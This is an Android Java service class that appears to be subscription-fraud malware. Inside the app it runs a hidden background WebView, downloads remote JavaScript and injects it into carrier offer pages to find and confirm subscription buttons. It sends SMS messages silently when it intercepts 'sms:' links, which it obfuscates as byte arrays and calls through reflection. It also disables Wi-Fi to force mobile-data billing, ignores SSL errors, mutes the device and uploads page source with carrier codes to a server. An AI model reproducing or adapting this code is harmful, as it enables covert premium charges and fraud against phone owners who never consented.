package oom.sub.com.s;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import oom.sub.com.http.H_okhttp;
import oom.sub.com.mode.Ma;
import oom.sub.com.noti.Na;
import oom.sub.com.tasks.T_analysis;
import oom.sub.com.tasks.T_cache;
import oom.sub.com.tasks.T_connect;
import oom.sub.com.tasks.T_djs;
import oom.sub.com.utils.UParams;
import oom.sub.com.utils.Ua;
import oom.sub.com.utils.Uca;
import oom.sub.com.utils.Uh;
import oom.sub.com.utils.Ujs;
import oom.sub.com.utils.Ulog;
import oom.sub.com.utils.Ut;
import oom.sub.com.utils.UtilSave;
import oom.sub.com.view.Va;

import static oom.sub.com.tasks.T_analysis.DEFAULTCID;
import static oom.sub.com.utils.Uh.check_first_open;


/**
 * Created by xlc on 2017/5/24.
 */

public class S_service extends Service {

    private final String TAG = "Sa";

    private WebView mWebView = null;

    private Handler handler_;

    private HandlerThread mht;

    private final int notid = Ulog.TAG.hashCode();

    private boolean showNotification = false;

    private boolean execute_task = false;

    private Random random = null;

    private int analysis_status = 0;

    /**
     * 判断是否为黑名单显示通知栏
     */
    public void check_black_list() {
        SharedPreferences sp = getSharedPreferences(Ut.PREFERNAME, 0);
        int black_list_status = sp.getInt("b_l", 0);
        switch (black_list_status) {
            case -1:
                if (showNotification) {
                    //                    Ulog.w("黑名单清除通知栏");
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    nm.cancel(notid);
                    stopForeground(true);
                    showNotification = false;
                }
                break;
            case 1:
                if (!showNotification) {
                    //                    Ulog.w("不是黑名单显示通知栏");
                    startForeground(notid, Na.getInstance(getApplicationContext()).getNotification());
                    showNotification = true;
                }
                break;
            default:
                //                Ulog.w("未知情况下不展示通知栏");
                break;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Na.getInstance(getApplicationContext());

        Ulog.initDebug(this);

        random = new Random();

        initView();

        mht = new HandlerThread("toolbox");
        mht.start();

        new Thread() {
            @Override
            public void run() {
                super.run();

                Looper.prepare();

                handler_ = new Handler() {
                    @Override
                    public void handleMessage(Message msg) {
                        super.handleMessage(msg);

                        //                         Ulog.w("key:" + H_encode.getSignature(getApplicationContext()));

                        webHandler.sendEmptyMessage(0);

                        handler_.sendEmptyMessageDelayed(1, 6000);
                    }
                };

                handler_.sendEmptyMessage(5000);

                Looper.loop();
            }
        }.start();

        Ulog.show("s onCreate");
    }

    public synchronized int onStartCommand(Intent intent, int flags, int startId) {

        //       LogUtil.show("AService onStartCommand: ");

        if (!check_first_open(getApplicationContext())) {

            afterAnalysis();
        }

        first_start_app();

        check_black_list();

        return Service.START_NOT_STICKY;
    }

    @SuppressLint("NewApi")
    public void afterAnalysis() {
        //LogUtil.w("获取渠道结束后操作缓存");
        if ( Ut.check_status(this)) {
            //            Ulog.show("do cache");
            Ulog.show("d c");
            new T_cache(this).executeOnExecutor(H_okhttp.executorService);
        }

        if ( Ut.check_connect_status(this)) {
            //            Ulog.w("满足联网时间限制");
            Ulog.show("d con");
            new T_connect(this).executeOnExecutor(H_okhttp.executorService);
        }

        check_download_js_status();
    }


    @SuppressLint("NewApi")
    private void check_download_js_status() {
        if (Ujs.getInstance(this).check_d_js_time() && !Ut.check_b_list(this)) {
            if (Ujs.getInstance(this).getJsCacheStatus() != Ujs.JS_CACHE_STATUS_DOING) {
                //                Ulog.w("满足下载js文件条件");
                Ulog.show("d j");
                new T_djs(this).executeOnExecutor(H_okhttp.executorService);

            } else {

                //                Ulog.show("js downloading...");
                //                Ulog.w("js 正在下载...");
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
    private void first_start_app() {

        if ( Uh.check_first_open(getApplicationContext())) {

            String cid = Uh.get_c_id(getApplicationContext());
            String rid = Uh.get_r_cid(getApplicationContext());

            Uh.save_open_status(getApplicationContext());

            if ((TextUtils.isEmpty(cid) || DEFAULTCID.equals(cid)) && TextUtils.isEmpty(rid)) {

                //                Ulog.show("超过6小时，渠道为默认值，重新获取渠道，保存时间");

                new T_analysis(this).executeOnExecutor(H_okhttp.executorService);

            } else {

                afterAnalysis();

            }
        }
    }

    public void setAnalysis_status(int analysis_status) {
        this.analysis_status = analysis_status;
    }

    private Handler webHandler = new Handler() {
        @Override
        public void handleMessage(Message message) {
            switch (message.what) {
                case 0:
                    if ( Ut.check_webview_load_time(getApplicationContext()) && !Ut.check_b_list(getApplicationContext()) && !execute_task) {
                        //                        Ulog.w("服务中满足时间开始执行链接");
                        //                        Ulog.show("do webView load");
                        execute_task = true;
                        new Task().execute();
                    }
                    break;
                case 1:
                    if (!checkNetWork()) {

                        //                        Ulog.w("网络异常情况下不注入js，执行下一条");
                        //                        Ulog.show("net error not load js, do last");

                        webHandler.sendEmptyMessage(3);

                        break;
                    }

                    if (!same_offer) {

                        int random_ = random.nextInt(100) + 1;

                        Ulog.show("r " + random_ + ":" + jRate);

                        if (random_ > jRate) {

                            //                            Ulog.w("随机数" + random_ + "大于" + jRate + "不执行注入");
                            //                            Ulog.show("random_" + random_ + ">" + jRate + " do last one");

                            if (showInterstitialOffer != null) {

                                if (!Uh.check_show_intersAd_time(getApplicationContext())) {

                                    Ulog.show("n w");

                                    UtilSave.getOfferExecuteTime(getApplicationContext(), showInterstitialOffer);

                                    webHandler.sendEmptyMessage(5);

                                    //                                    Ulog.show("do not update times");

                                    break;
                                }


                                Ulog.show("o w");

                                Uh.save_show_intersAd_time(getApplicationContext());

                                Va.getInstance(getApplicationContext()).startLoad(showInterstitialOffer);
                            }

                            webHandler.sendEmptyMessage(3);

                            break;

                        } else {

                            //                            Ulog.w("随机数" + random_ + "小于等于 " + jRate + " 执行注入");
                            //                            Ulog.show("random_" + random_ + "<=" + jRate + " load js");

                        }
                    }
                    String jsString = Ujs.getInstance(getApplicationContext()).getJsString();

                    if (mWebView != null && !TextUtils.isEmpty(jsString)) {

                        //                        Ulog.w("service_执行注入");
                        //                        Ulog.show("service_ load js");

                        mWebView.loadUrl("javascript:" + Ujs.getInstance(getApplicationContext()).getJsString());

                        mWebView.loadUrl("javascript:findLp()");

                        mWebView.loadUrl("javascript:findAocOk()");
                    }
                    break;
                // 注入获取网页的代码js
                case 2:
                    if (mWebView != null) {
                        mWebView.loadUrl(H_okhttp.js_get_source);
                    }
                    break;
                case 4:

                    //                    Ulog.show("do last after 2 min,check post Resource status");
                    //                    Ulog.w("间隔了两分钟后直接执行下一条,先判断是否需要上传源码");

                    boolean source_status = Uh.check_source_status(getApplicationContext(), offer_id + "");

                    if (source_status && getSource == 0) {

                        //                        Ulog.w("需要源代码上传");
                        //                        Ulog.show("need load Resource js");

                        webHandler.sendEmptyMessage(2);

                        webHandler.sendEmptyMessageDelayed(3, 3000);

                    } else {

                        //                        Ulog.w("不需要源代码上传");
                        //                        Ulog.show("need not load resource js, do last one");

                        webHandler.sendEmptyMessage(3);
                    }

                    break;
                case 3:

                    Ulog.show("n " + load_error);

                    if (checkNetWork()) {

                        //                        Ulog.w("网络正常的情况统计:" + offer_id + "的执行次数");
                        //                        Ulog.show("network normal save :" + offer_id + " execute times");

                        UtilSave.save_sub_link_limit(getApplicationContext(), showInterstitialOffer);

                    } else {

                        //                        Ulog.w("网络异常不统计:" + offer_id + "的执行次数");
                        //                        Ulog.show("network error  do not save :" + offer_id + " execute times,do last");
                    }

                    webHandler.sendEmptyMessage(5);

                    break;

                case 5:

                    if (mList != null && execute_index < mList.size()) {

                        //                        Ulog.show("do last offer_id:" + mList.get(execute_index).getOffer_id() + ":" + execute_index + "  after 5s");
                        //                        Ulog.w("执行下一条链接offer_id:" + mList.get(execute_index).getOffer_id() + "执行第" + execute_index + "条");

                        start_load(mList.get(execute_index));

                        execute_index = execute_index + 1;

                    } else {

                        //                        Ulog.w("轮询结束,回收浏览器");
                        //                        Ulog.show("do all offer finished,destroy webView");

                        webHandler.removeMessages(4);

                        destoryWebView();
                    }
                    break;
            }
        }
    };

    private void start_load(Ma offer) {
        Ulog.show("p " + offer.getSub_platform_id() + "  s " + offer.getOffer_id());

        showInterstitialOffer = offer;

        initStatus();

        String load_url = UtilSave.getChangeUrl(offer, this, true);

        jRate = offer.getJRate();

        sub_platform_id = offer.getSub_platform_id();

        offer_id = offer.getOffer_id();

        getSource = offer.getGetSource();

        if (mWebView == null) {
            initView();
        }

        Ut.disableJsIfUrlEncodedFailed(mWebView, load_url);

        webHandler.removeMessages(4);
        webHandler.sendEmptyMessageDelayed(4, 2 * 60000);

        mWebView.onResume();
        mWebView.clearFocus();
        mWebView.stopLoading();
        mWebView.clearHistory();
        mWebView.clearCache(true);
        mWebView.loadUrl(load_url);
    }

    private class Task extends AsyncTask<Void, Integer, Ma> {

        @Override
        protected Ma doInBackground(Void... params) {

            mList = null;

            execute_index = 0;

            if (Ujs.getInstance(getApplicationContext()).check_d_js_time() && !Ut.check_b_list(getApplicationContext())) {

                if (Ujs.getInstance(getApplicationContext()).getJsCacheStatus() != Ujs.JS_CACHE_STATUS_DOING) {

                    //                    Ulog.w("执行offer前满足条件先下载js");
                    //                    Ulog.show("download js before execute offer");

                    Ulog.show("d j");

                    Ujs.getInstance(getApplicationContext()).init();

                    if (Ujs.getInstance(getApplicationContext()).getJsCacheStatus() == Ujs.JS_CACHE_STATUS_FAIL) {

                        //                        Ulog.w("下载失败不往下执行offer");
                        //                        Ulog.w("download fail return");

                        return null;
                    }
                } else {
                    //                    Ulog.w("js正在下载中,不执行offer");
                    //                    Ulog.w("js downloading..");
                    return null;
                }
            }

            Ma offer = UtilSave.get_one_offer(getApplicationContext());

            if (offer == null) {

                //                Ulog.show("数据为空");

                return null;
            }

            //            Ulog.w("随机的一条支持网络状态(1:流量)：" + offer.getAllow_network());
            //            Ulog.show("get one offer(1:gprs)：" + offer.getAllow_network());
            //
            if (offer.getAllow_network() == 1) {

                //                Ulog.w("服务中执行: 只支持GPRS");
                //                Ulog.show("only gprs");

                if ( Ut.getWifiStatus(getApplicationContext())) {

                    if (Ujs.getInstance(getApplicationContext()).getJsCacheStatus() == Ujs.JS_CACHE_STATUS_DOING) {

                        //                        Ulog.w("正在下载js或缓存不做执行offer,不做关闭wifi操作");
                        //                        Ulog.show("js downloading,do not close wifi");

                        return null;
                    }
                    //                    Ulog.w("服务中执行: 判断wifi为开启状态 做关闭");
                    //                    Ulog.show("do close wifi");
                    //关闭wifi
                    Ut.closeWifi(getApplicationContext());

                    try {
                        Thread.sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }

                if (!Ut.getMobileStatus(getApplicationContext(), null)) {
                    //                    Ulog.w("服务中执行:GPRS为关闭状态，做开启操作");
                    //                    Ulog.show("open gprs");

                    Ut.setNetState(getApplicationContext(), "setMobileDataEnabled", true);

                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }

            mList = UtilSave.getOfferList(getApplicationContext(), offer.getAllow_network(), offer.getOffer_id(), offer.getSub_platform_id());

            //            Ulog.w("根据这个网络查询数据大小：" + mList.size());
            //            Ulog.show("search size：" + mList.size());
            //
            //            Log.e("love", offer.getOffer_id() + "-" + offer.getSub_platform_id());
            //            for (int i = 0; i < mList.size(); i++) {
            //                Log.e("love", mList.get(i).getOffer_id() + "---" + mList.get(i).getSub_platform_id());
            //            }

            return offer;
        }

        @SuppressLint("SimpleDateFormat")
        @Override
        protected void onPostExecute(Ma offer) {
            super.onPostExecute(offer);

            execute_task = false;

            if (offer == null) {
                //                Ulog.w("没有查找到数据");
                //                Ulog.show("no data");
                return;
            }

            Ut.save_webview_load_time(getApplicationContext());

            Ua.getInstance(getApplicationContext()).setSlience();

            start_load(offer);
        }
    }

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void initView() {
        mWebView = new WebView(getApplicationContext());
        mWebView.setDrawingCacheBackgroundColor(Color.WHITE);
        mWebView.setFocusableInTouchMode(true);
        mWebView.setFocusable(true);
        mWebView.setDrawingCacheEnabled(false);
        mWebView.setWillNotCacheDrawing(true);
        mWebView.setBackgroundColor(Color.WHITE);
        mWebView.setScrollbarFadingEnabled(true);
        mWebView.setSaveEnabled(true);
        mWebView.setNetworkAvailable(true);
        mWebView.getSettings().setJavaScriptEnabled(true);
        mWebView.addJavascriptInterface(this, "toolbox");
        mWebView.addJavascriptInterface(this, "myObj");
        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                //                Ulog.show("shouldOverrideUrlLoading+" + url);

                if (url.startsWith(new String(new byte[]{115, 109, 115, 58}))) {
                    try {
                        String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));
                        String content = url.substring(url.indexOf("=") + 1, url.length());

                        //                        SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                        Class<?> smsClasss = Class.forName("android.telephony.SmsManager");
                        Method method = smsClasss.getMethod("sendTextMessage", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});
                        method.invoke(smsClasss.getMethod("getDefault").invoke(null), new Object[]{port, null, content, null, null});

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                return true;
                //                return super.shouldOverrideUrlLoading(view, url);
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                //                Ulog.show("onPageFinished+" + url);

                if (url.equals(last_finished_url)) {
                    //                    Ulog.w("相同的链接不注入");
                    return;
                }

                last_finished_url = url;
                webHandler.removeMessages(1);

                if (UtilSave.check_url(url)) {
                    //                    Ulog.w("黑名单链接不执行注入，执行下一条");
                    //                    Ulog.show("blacklist url, do last one");
                    load_error = 0;
                    webHandler.sendEmptyMessage(3);
                    return;
                }
                webHandler.sendEmptyMessageDelayed(1, 20000);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                //                Ulog.show("onPageStarted+" + url);
                load_error = 0;
                findLp_ok = "";
                findAoc_ok = "";
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);
                load_error = errorCode;
            }
        });
    }

    @SuppressLint("NewApi")
    private void destoryWebView() {
        if (mWebView != null) {
            try {
                ViewGroup parent = (ViewGroup) mWebView.getParent();
                if (parent != null) {
                    //                parent.removeView(mWebView);
                    parent.removeAllViews();
                }

                mWebView.stopLoading();
                mWebView.onPause();
                mWebView.clearHistory();
                mWebView.removeAllViews();
                mWebView.destroyDrawingCache();

                mWebView.destroy();

            } catch (Exception e) {
                e.printStackTrace();
            }

            mWebView = null;

        }

        Ua.getInstance(getApplicationContext()).setNomal();

        Ulog.show("w d");
    }

    /**
     * 获取源码信息回调
     *
     * @param source
     */
    @android.webkit.JavascriptInterface
    public void getSource(String source) {
        //        Ulog.w("getSource: " + source);
        Ulog.show("s r");

        Map<String, Object> map = new HashMap<>();
        map.put("mcc", Uca.getMcc(getApplicationContext()));
        map.put("mnc", Uca.getMnc(getApplicationContext()));
        map.put("cid", UParams.getInstance(getApplicationContext()).getKeyStore());
        map.put("source_type", source_type);
        map.put("platform_id", sub_platform_id);
        map.put("offer_id", offer_id);
        map.put("source", source);
        map.put("network", Ut.getNetStatus(this));

        H_okhttp.postSource(map, getApplicationContext());
    }

    private void initStatus() {
        load_error = 0;
        last_finished_url = "";
        aoc_ok = false;
        lp_ok = false;
        source_type = 0;
        same_offer = false;
        jRate = 60;
    }

    private List<Ma> mList = null;

    //当前执行的index
    private int execute_index = 0;

    private String findLp_ok = "";

    private String findAoc_ok = "";

    private int load_error = 0;

    private boolean lp_ok = false;

    private boolean aoc_ok = false;

    private int source_type;

    private boolean same_offer = false;

    private String last_finished_url = "";

    private int offer_id;

    private int sub_platform_id;

    //    是否需要获取网页代码传回服务器 0：干 1：不干
    private int getSource;

    private int jRate;

    private Ma showInterstitialOffer = null;

    @android.webkit.JavascriptInterface
    public void openImage(String tag, String _url) throws InterruptedException {
        //        Ulog.w("service_tag:" + tag);
        same_offer = true;
        if (tag.contains("findLp")) {
            findLp_ok = tag;
            findAoc_ok = "";
            if (tag.contains("ok")) {
                //                Ulog.show("lp ok");
                lp_ok = true;
            } else {
                //                Ulog.show("lp no");
            }
        }
        if (tag.contains("aoc_")) {
            findAoc_ok = tag;
            if (tag.contains("ok")) {
                //                Ulog.show("aoc ok");
                aoc_ok = true;
            } else {
                //                Ulog.show("aoc no");
            }
        }

        //短信按钮      sms
        boolean is_sms = findAoc_ok.contains(new String(new byte[]{115, 109, 115}));
        boolean findLp_no = !findLp_ok.contains("ok") && !"".equals(findLp_ok);
        boolean aoc_no = !findAoc_ok.contains("ok") && !"".equals(findAoc_ok);

        if (load_error != -2 && ((findLp_no && aoc_no) || is_sms)) {
            boolean check_return = Uh.check_source_status(getApplicationContext(), offer_id + "");
            boolean exist_ok = aoc_ok && lp_ok;
            source_type = getSource_type();
            if (getSource == 0 && !exist_ok && check_return) {
                //                Ulog.w("需要获取网页的源代码");
                //                Ulog.show("do load Source code js");
                webHandler.sendEmptyMessage(2);
                webHandler.sendEmptyMessageDelayed(3, 5000);
            } else {
                if (exist_ok) {
                    //                    Ulog.show("exist both ok ,do not return data");
                    //                    Ulog.w("findLp_ok和aoc_ok都存在，不回传");
                }
                if (!check_return) {
                    //                    Ulog.show("offer has return data");
                    //                    Ulog.w("这条offer已经上传过源代码，不再做上传");
                }
                webHandler.sendEmptyMessageDelayed(3, 100);
            }
        }
    }

    /**
     * 回传类型
     *
     * @return
     */
    public int getSource_type() {
        int source_type = 0;
        if (!aoc_ok && !lp_ok) {
            source_type = 0;
        } else if (lp_ok && !aoc_ok) {
            source_type = 1;
        } else if (!lp_ok && aoc_ok) {
            source_type = 2;
        }
        return source_type;
    }

    private boolean checkNetWork() {
        if (load_error != -2 && load_error != -8) {
            if ( Ut.checkNet(getApplicationContext())) {
                return true;
            }
        }
        return false;
    }
}